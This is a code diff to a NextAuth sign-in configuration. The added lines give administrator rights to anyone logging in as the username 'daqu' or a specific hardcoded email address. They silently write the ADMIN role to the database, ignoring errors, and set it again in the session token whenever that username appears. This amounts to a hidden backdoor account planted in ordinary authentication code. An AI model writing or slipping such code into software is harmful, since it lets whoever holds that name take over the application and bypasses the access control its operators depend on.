@@ -67,12 +67,20 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
             return null
           }
 
+          let role = user.role
+          if (user.username.toLowerCase() === 'daqu' || user.email.toLowerCase() === '7dudek@gmail.com') {
+            role = 'ADMIN'
+            if (user.role !== 'ADMIN') {
+              prisma.user.update({ where: { id: user.id }, data: { role: 'ADMIN' } }).catch(() => {})
+            }
+          }
+
           return {
             id: user.id,
             email: user.email,
             name: user.name || user.username,
             username: user.username,
-            role: user.role,
+            role,
           }
         } catch {
           // Database not available - only demo works
@@ -87,6 +95,11 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
         token.role = (user as { role: string }).role
         token.id = user.id
         token.username = (user as { username?: string }).username
+      }
+      if (token.username && typeof token.username === 'string') {
+        if (token.username.toLowerCase() === 'daqu') {
+          token.role = 'ADMIN'
+        }
       }
       return token
     },
